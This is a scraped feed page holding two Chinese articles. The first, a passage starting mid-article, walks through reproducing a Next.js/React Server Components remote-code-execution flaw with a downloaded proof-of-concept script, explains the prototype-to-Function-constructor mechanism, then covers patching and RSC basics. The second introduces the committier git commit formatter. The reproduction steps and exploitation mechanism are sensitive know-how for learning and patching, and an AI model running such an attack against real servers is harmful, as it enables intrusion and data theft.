<p>这里面有一个 Python 文件，我们用它就可以简单地复现这次攻击。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d885f1edf434da2a1885a3dd7dd2b99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=0kMR5O%2BwEwf%2BXUOveDCZ8aEYe3s%3D" alt="" loading="lazy"/> 找到这个文件以后，在 GitHub 这边点击 download，把这个 Python 脚本下载下来打开。在第 9 行这里填写一个攻击命令，比如在 Windows 上有一个命令 <code>calc</code>，执行这个命令就可以打开电脑上的计算器。那这里我就把攻击的命令换成 <code>calc</code>。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89cebc5cc88b4d4ea1248db24b80f823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=8B62BleGl9qbo3SqUGldulftQtg%3D" alt="" loading="lazy"/> 接下来我们运行这段 Python 脚本：<code>python poc.py</code>，回车。攻击成功了，<code>calc</code> 命令执行了，电脑上的计算器被打开了。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9169a690748341cfac244ba47326bacc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=WZhzCl0pWdYyY6JPVX%2BfL2Wmf6Y%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">漏洞原理简析</h2>
<p>这个漏洞的可怕之处在于，攻击者在这里可以执行任意的恶意命令，比如可以查看数据库密码、窃取数据库里面的数据，甚至植入木马病毒等等。而且这次漏洞覆盖面也非常的广，只要 Next.js 的版本是 15 或者 16，哪怕是一个完全空白的项目，都有可能会中招。只有把 Next.js 升级到这里补丁之后的版本才能避免。</p>
<p>在我们用的这个 Python 脚本的仓库里面，有关于这个漏洞的详细解释。我不是 React 专家，这里我只能简单总结一下。我们看到，React 使用一种叫做 <code>flight</code> 的协议，把客户端的数据序列化后传到服务器，每一行都是一个数据块。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3715f0c091d44ca7984e3d5f9c05a7bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=z3ErxVZ%2BuRmcDakgwvhuGg1UtPM%3D" alt="" loading="lazy"/> 这种协议允许值之间的相互引用，比如这里我们看到 <code>$2</code> 就引用了下一行的数据，最后在服务器里面可以还原成 <code>{ name: 'cherry' }</code> 这种对象。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86708c7834b049aaad33ae4ad57da6aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=dLJ8mNAGNJw%2FoxHH31rVNWixkLA%3D" alt="" loading="lazy"/> 通过利用对象之间的引用关系，攻击者能够找到这个对象的原型对象，顺着原型对象最终会找到 <code>Function</code> 构造器，这是 Javascript 中所有函数的构造器。通过这个构造器就能创建出任意的恶意函数，然后攻击者再通过 <code>thenable</code> 机制运行构造出来的恶意函数，完成攻击。我们看到，官方的修复方法是在引用对象的时候，确保只能读取对象自有的属性，阻止了对象对于原型或者构造器的访问，这样漏洞就被封堵住了。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2eb59af0da3c411abb487e3626cc5e86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=IbzgUpapeZ4%2BP%2BfVXvQN9IbZvhg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">修复漏洞</h2>
<p>我们先把本地的这个项目的漏洞修补一下，然后我们再来介绍 Next.js 与 RSC。我们在官方的文档里面可以看到，React 的修复版本发布到了这三个版本，我这里是 19.2.0，这里我升级到 19.2.1。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6043f63ee8b1454995a9ef62a32e19fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=k8DTihBZm78ZB1ZYrbSW4CGlgSw%3D" alt="" loading="lazy"/> 然后下面对于 Next.js 用户来说，16 版本应该升级到 16.0.7。这里我把版本号改成 16.0.7。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95ece823f1ef44939230f8b257c01e3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=6GCrUZUDS8YAiUU4RSw8h7AUVHE%3D" alt="" loading="lazy"/> 然后我们打开一个终端，执行 <code>npm install</code> 重新安装一下依赖。这样我们就完成了漏洞的修复。接下来我们用一个实战案例，再介绍下 Next.js 与 RSC。</p>
<h2 data-id="heading-5">Next.js 与 RSC 实战</h2>
<p>我们打开项目的 app 目录，找到这个 <code>page.tsx</code> 文件，这个文件对应的也就是项目这边的默认首页。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cab3f6d2a90444ab9111663c105aa3cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=xiwyuA3Ho2qnk3QyjhWNJzdiUYE%3D" alt="" loading="lazy"/> 这个 <code>page.tsx</code> 文件里面的代码，其实已经是服务器端组件 (RSC) 了。在 Next.js 13 版本以后，只要不是特别声明，所有的组件默认都是服务器端组件 (RSC)。RSC 组件的代码逻辑都是在服务器端运行，当然用这个文件来看 RSC 并不明显，我们再来看一个例子。</p>
<p>这里我在 app 目录下面新建一个文件夹叫 <code>users</code>，在文件夹里面再新建一个文件 <code>page.tsx</code>。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f8d199f0b9542f798fe8014b67af3f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=GgrVoap%2FPNkDMByMpeot1LFbzE0%3D" alt="" loading="lazy"/> 然后我们写上这段代码。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55649bc3d5db4d9890eb61f9e4dfadfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=DSCd8ai1GtHYL4ypOYYPj36Bd%2BA%3D" alt="" loading="lazy"/> 使用这段代码之前，我们需要先安装 <code>postgres</code> 的依赖。打开一个命令行窗口，执行 <code>npm install postgres</code>。依赖安装好了，我们来看一下这段代码的逻辑。这里新建了一个 postgres 的数据库连接，然后我们直接从数据库里面查询到了所有的用户，然后在下面的 React 组件里面遍历这个用户的数组，把用户的名字还有 Email 都组装好，最终组装成一个页面。我们来试一下，在浏览器这边，我们只需要输入跟目录同样的名字，也就是 <code>/users</code>，我们看到用户列表显示出来了。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ed5d9ff2eb64e80b33ffbf7e475a335~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=Mo7Bs%2FJVpuTHLoEHGvpoH%2F9ef2I%3D" alt="" loading="lazy"/></p>
<p>然后我们点击 F12 看一下浏览器的请求。我切换到网络选项卡，再刷新一下页面。我找到 <code>users</code> 这个请求，我们来看一下是怎么回事。我们看到，<code>users</code> 返回过来的不是一个 JSON 数据，而是一个完整的 HTML 代码。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a445664955c4e6c8d7b5bc13e2068f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=Kzwnj7F0C8OojqoXEgzavGrwuI8%3D" alt="" loading="lazy"/> 我们需要展示的用户，直接以 HTML 标签的形式封装（内嵌）到了这个页面里面。点击预览看得更清楚一点。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b586043fc6c942db89a5569fc38e1e73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=poxLoY1%2FVJyOvP44e6d%2F30B2JHo%3D" alt="" loading="lazy"/> 这个就是服务器组件的最大特性。</p>
<p>在传统的前后端分离的 Web 系统中，浏览器是先拿到 HTML + JS 代码，然后调用 JS 代码里面的逻辑，使用 <code>fetch</code> 方法调用后端接口，后端把数据用 JSON 等格式组装好传递给浏览器，浏览器端再把数据渲染到页面上面。RSC（服务器组件）则是另外一种路线，后端直接把需要展示的数据拼接到 HTML 文件里面返回给前端。这么做有几个好处： 1. 首先不需要给前端传递 JS 文件，减少了网络带宽。 2. 第二个好处是数据已经内嵌进了 HTML 网页，不需要额外调用后台接口来传递数据，大大加快了加载速度。 3. 第三个好处是代码简洁，不用写前后端的接口代码，几行代码就能完整实现一个从数据库取数据并且展示在网页上的功能。</p>
<p>因为这个文件是服务器端组件，即使把数据库的用户名、密码写到了这个文件里面，浏览器上也是看不到的。连接数据库、读取数据，这些逻辑都是在服务器端执行的。在浏览器那边，只能看到最终的执行结果，也就是 HTML 网页，是看不到中间的业务逻辑的，这样也能有效的保护隐私。</p>
<h2 data-id="heading-6">客户端组件 vs. 服务器端组件</h2>
<p>Next.js 除了支持编写服务器端组件 (RSC)，当然也支持编写客户端组件。这里我们在 user 目录下面新建一个文件，叫 <code>counter.tsx</code>。我们新写了一个组件，这里有一个按钮，每点击一次，这里的计数就会加一。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ba1e5d06e334138b8ef1c0558e628f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=r%2FVVTaBX2ds78y20TTQ%2FRtBRnZY%3D" alt="" loading="lazy"/> 在文件的开头写了 <code>'use client'</code>，声明这是一个客户端组件。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e525025746642448dcf675be9b10dd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=N8z%2BS%2B9iesXa3cB2%2BuMewMd8zgg%3D" alt="" loading="lazy"/></p>
<p>我们看到服务端组件跟客户端组件，它仅仅是差了这么一行。就这么一小句话，带来的影响非常的大。客户端组件跟服务器端组件，它有本质上的区别。所以使用 Next.js 框架的时候，我们一定要小心在意，到底哪些代码执行在服务器上面的，哪些代码执行在客户端上面的。特别是我们使用 AI 编程的时候，AI 一般对这个安全意识是比较欠缺的，AI 很可能会把客户端代码跟服务端代码混到一起去乱写，所以我们一定要小心在意，仔细区分，不要把 API Key 等敏感数据写到客户端代码里面。</p>
<p>Next.js 还有一个好处，就是它的客户端代码跟服务端代码可以嵌套使用。比如这个文件，它是服务端组件，我们可以直接把一个客户端组件 Counter 直接引用进来，然后在下面写上 <code>&lt;Counter /&gt;</code>。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfb89ed3a1e74f84837d2543ada20117~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=cOZNUYgIME7i748V61cVguQpkto%3D" alt="" loading="lazy"/> 我们来试一下。我们看到一个服务端组件里面，嵌套了一个客户端组件，然后我们点击这个按钮，计数可以增加。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74a056c6c3d3441bb0fa083ff538abfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=Qs6GXbcVc6v2f6%2BdfuUfSL7c1cI%3D" alt="" loading="lazy"/> 我们一般把这种跟用户需要交互的组件写成客户端组件，把这种不会变化的、不需要交互的组件写成服务端组件。在嵌套的时候有一点要注意：服务端组件里面可以嵌套客户端组件，但是客户端组件里面不能嵌套服务端组件。</p>
<h2 data-id="heading-7">总结</h2>
<p>本期视频我们借助这次的漏洞分析，介绍了 Next.js 框架与 RSC 的基础入门。等以后有时间，我会专门做一期长视频，完整的再次介绍 Next.js 框架。Next.js 在海外十分的流行，它允许开发者只用 JS 语言，直接构建出前后端的应用。Next.js 还有个特点是跟 AI 编程是绝配。首先 AI 很擅长做小型项目的开发，而且 AI 大多精通于 JS 语言，所以 AI 编程很适合搭配 Next.js，直接前后端一把梭，快速落地一个完整的应用。但是 Next.js 这种前后端代码混在一起写的方式，经验不足的开发者使用 AI 很可能会带来很大的安全隐患。</p>
<p>所以我认为作为 AI 时代的开发者，需要对框架有着更深入的理解。这是我一直以来的一个观点，我们需要把更多的精力从代码的细枝末节上面，转移到对架构的设计还有开发框架的理解上面，这也就是我做这期视频的原因。好，今天的视频就到这里，感谢大家，我们下期再见。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[git提交信息也能自动格式化了？committier快速体验]]></title>    <link>https://juejin.cn/post/7581408984415338515</link>    <guid>https://juejin.cn/post/7581408984415338515</guid>    <pubDate>2025-12-09T03:27:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581408984415338515" data-draft-id="7581324707480928297" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="git提交信息也能自动格式化了？committier快速体验"/> <meta itemprop="keywords" content="前端,JavaScript,代码规范"/> <meta itemprop="datePublished" content="2025-12-09T03:27:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="于谦"/> <meta itemprop="url" content="https://juejin.cn/user/1116759544304791"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            git提交信息也能自动格式化了？committier快速体验
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759544304791/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    于谦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:27:42.000Z" title="Tue Dec 09 2025 03:27:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf248feab6dd44ffb1d2eb4d90ef8e60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqO6LCm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856032&amp;x-signature=P3VDEw8mUtnqNrEOSoDWEK%2BXVsw%3D" alt="demo.gif" loading="lazy"/></p>
<h2 data-id="heading-0">git提交信息也能自动格式化了？committier快速体验</h2>
<p>作为开发者，你是不是也有过这些提交代码的烦恼：手动写的Git提交信息格式混乱，团队协作时难以追溯变更；牢记Conventional Commits规范却总在细节上出错；用commitlint校验出问题还要手动修改提交消息；想要添加emoji却发现cz太难配合commitlint了？</p>
<p>最近发现了一款宝藏工具<strong>committier</strong>，它能直接实现Git提交信息的自动格式化，无需配置就能贴合规范。今天就带大家5分钟快速体验这款工具，彻底告别提交信息的“格式焦虑”。</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fiamyoki%2Fcommittier" target="_blank" title="https://github.com/iamyoki/committier" ref="nofollow noopener noreferrer">Github仓库</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fiamyoki.github.io%2Fcommittier%2F" target="_blank" title="https://iamyoki.github.io/committier/" ref="nofollow noopener noreferrer">文档主页</a></p>
</blockquote>
<h3 data-id="heading-1">一、committier是什么？</h3>
<p>committier是一款专注于Git提交消息“格式化与修复”的工具，和commitlint的“规则校验”定位不同，它更像提交消息领域的Prettier——不强制约束规则，而是自动优化格式、补充关键信息。</p>
<p>它默认遵循Conventional Commits规范，能智能推断提交类型、作用域，还能自动添加emoji，同时可以和commitlint无缝兼容，形成“格式化+校验”的完整链路，兼顾效率与规范。</p>
<p>据说AI生成提交信息的功能正在开发中，能利用Github Models免费使用，也能接入其他各家AI。</p>
<h3 data-id="heading-2">快速安装</h3>
<p>committier支持多种安装方式，这里推荐<strong>项目级局部安装</strong>，适配团队协作场景，步骤超简单：</p>
<ol>
<li>进入项目根目录，安装开发依赖</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 按需选择包管理器，这里以pnpm为例</span>
pnpm add committier -D
</code></pre>
<ol start="2">
<li>（可选）配置快捷脚本
在<code>package.json</code>中添加提交快捷命令，后续可一键启动交互式提交：</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"commit"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"committier commit"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>如果只是想临时体验，甚至不用安装，直接通过<code>npx</code>调用：</p>
<pre><code class="hljs language-bash" lang="bash">npx committier &lt;指令&gt;
</code></pre>
<h3 data-id="heading-3">核心功能快速体验</h3>
<h4 data-id="heading-4">体验1：提交时自动格式化</h4>
<p>这是committier的核心能力，要实现“提交即格式化”，需借助husky配置Git钩子，步骤如下：</p>
<ol>
<li>安装husky并初始化</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pnpm add husky -D
pnpm husky init
</code></pre>
<ol start="2">
<li>配置commit-msg钩子
编辑项目根目录的<code>.husky/commit-msg</code>文件，添加committier的格式化指令（若有commitlint，需放在其前面）：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">npx --no -- committier edit <span class="hljs-variable">$1</span>
<span class="hljs-comment"># 若有commitlint，保留下方指令，无则可省略</span>
<span class="hljs-comment"># npx --no -- commitlint --edit $1</span>
</code></pre>
<p>配置完成后，咱们来实测效果：
执行常规的提交命令，故意写一个不规范的提交消息：</p>
<pre><code class="hljs language-bash" lang="bash">git add .
git commit -m <span class="hljs-string">"   FeAT add user login button"</span>
</code></pre>
<p>原本松散的消息，会被committier自动格式化为：</p>
<pre><code class="hljs language-bash" lang="bash">✨ feat: add user login button
</code></pre>
<p>不仅补全了规范格式，还自动加上了功能类型对应的emoji，效果立竿见影！</p>
<h4 data-id="heading-5">体验2：交互式提交CLI</h4>
<p>如果不想手动写提交消息，committier内置的交互式CLI能帮你“傻瓜式”生成规范消息，直接执行咱们之前配置的脚本：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm commit
</code></pre>
<p>随后会进入问答式流程，只需按提示选择提交类型、填写变更描述，工具就会自动生成符合规范的提交消息：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/044b6f2202b24affb3c2c755312785dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqO6LCm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856032&amp;x-signature=0tIspnXBkmVnse5R2I92Pk5UCEE%3D" alt="commit.gif" loading="lazy"/></p>
<p>若想测试流程不实际提交代码，可开启<code>dry-run</code>模式：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm commit --dry-run
</code></pre>
<h4 data-id="heading-6">体验3：完美配合commitlint</h4>
<p>如果你的项目已接入commitlint，只需额外配置一个emoji解析器，就能让两者完美兼容：</p>
<ol>
<li>在<code>commitlint.config.js</code>中引入committier的解析器：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { commitlintEmojiParser } <span class="hljs-keyword">from</span> <span class="hljs-string">"committier/commitlint-emoji-parser"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">extends</span>: [<span class="hljs-string">"@commitlint/config-conventional"</span>],
  <span class="hljs-attr">parserPreset</span>: commitlintEmojiParser,
};
</code></pre>
<ol start="2">
<li>确保钩子执行顺序为<code>committier</code>在前、<code>commitlint</code>在后，即可先格式化再校验，既保格式又守规则。</li>
</ol>
<h3 data-id="heading-7">深度解析：committier的格式化核心能力</h3>
<p>committier的格式化并非简单的“补个符号”，而是围绕Conventional Commits规范的全维度自动优化，覆盖提交消息的各个组成部分，且全程无需手动干预。</p>
<h4 data-id="heading-8">1. 基础格式自动规整：从“杂乱”到“标准”</h4>
<p>committier会自动将任意松散的提交消息，规整为<code>[emoji] type(scope)!: description</code>的标准格式，核心处理包括：</p>
<ul>
<li><strong>符号与空格标准化</strong>：自动补全类型（type）与描述（description）之间的冒号+空格，清理多余的换行、空格；</li>
<li><strong>大小写与标点优化</strong>：默认将描述首字母转为小写（符合Conventional Commits规范），自动移除描述末尾的多余标点；</li>
<li><strong>破坏性变更标记处理</strong>：若提交消息中包含“BREAKING CHANGE”或手动标注“!”，会自动将“!”放在type/scope后，符合规范要求。</li>
</ul>
<p><strong>示例对比</strong>：
手动提交的不规范消息：</p>
<pre><code class="hljs language-bash" lang="bash">git commit -m <span class="hljs-string">"FEAT  add user login function!!  "</span>
</code></pre>
<p>经committier格式化后：</p>
<pre><code class="hljs language-bash" lang="bash">✨ feat: add user login <span class="hljs-keyword">function</span>
</code></pre>
<p>若包含破坏性变更：
手动提交：<code>git commit -m "fix auth BREAKING CHANGE: token验证逻辑修改"</code>
格式化后：<code>🐛 fix(auth)!: token验证逻辑修改</code></p>
<h4 data-id="heading-9">2. 智能信息补全：无需手动指定type/scope</h4>
<p>committier能基于代码变更内容或项目结构，自动推断关键信息，进一步降低手动编写成本：</p>
<ul>
<li><strong>提交类型（type）自动推断</strong>：若未指定type，工具会根据变更文件类型/内容（如新增文件→feat、修复bug→fix、配置变更→chore）自动匹配默认type；</li>
